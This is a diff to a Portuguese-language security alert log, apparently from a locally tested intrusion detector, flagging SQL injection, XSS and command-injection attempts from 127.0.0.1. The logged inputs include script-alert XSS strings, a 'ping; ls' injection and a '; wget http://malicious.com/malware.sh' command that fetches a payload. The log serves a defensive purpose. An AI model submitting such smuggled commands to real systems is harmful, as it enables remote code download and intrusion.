@@ -1,2 +1,13 @@
 2024-10-10 22:51:19,338 - ALERT - Possível tentativa de SQL Injection pelo usuário SELECT * FROM do IP 127.0.0.1.
 2024-10-10 22:52:11,719 - ALERT - Possível tentativa de SQL Injection pelo usuário SELECT * FROM do IP 127.0.0.1.
+2024-10-12 12:43:09,720 - ALERT - Teste de logging iniciado com sucesso.
+2024-10-12 12:48:56,662 - ALERT - Teste de logging iniciado com sucesso.
+2024-10-12 12:49:22,840 - ALERT - Teste de logging iniciado com sucesso.
+2024-10-12 12:55:09,231 - ALERT - Múltiplas tentativas de login falhas para o usuário <script>alert('XSS Test');</script>.
+2024-10-12 12:57:31,739 - ALERT - Possível tentativa de Script Injection (XSS) pelo usuário <script>alert('XSS Test');</script> do IP 127.0.0.1.
+2024-10-12 12:58:34,217 - ALERT - Possível tentativa de Command Injection pelo usuário ping 127.0.0.1; ls do IP 127.0.0.1.
+2024-10-12 12:59:13,946 - ALERT - Possível tentativa de Script Injection (XSS) pelo usuário <script>alert('a');</script> do IP 127.0.0.1.
+2024-10-12 13:02:52,656 - ALERT - Possível tentativa de Script Injection (XSS) pelo usuário <script>alert('add');</script> do IP 127.0.0.1.
+2024-10-12 13:05:44,788 - ALERT - Possível tentativa de Script Injection (XSS) pelo usuário <script>alert('add');</script> do IP 127.0.0.1.
+2024-10-12 13:05:57,790 - ALERT - Possível tentativa de Script Injection (XSS) pelo usuário <script>alert('SOCKETSSS');</script> do IP 127.0.0.1.
+2024-10-12 13:06:59,273 - ALERT - Possível tentativa de Command Injection pelo usuário ; wget http://malicious.com/malware.sh do IP 127.0.0.1.
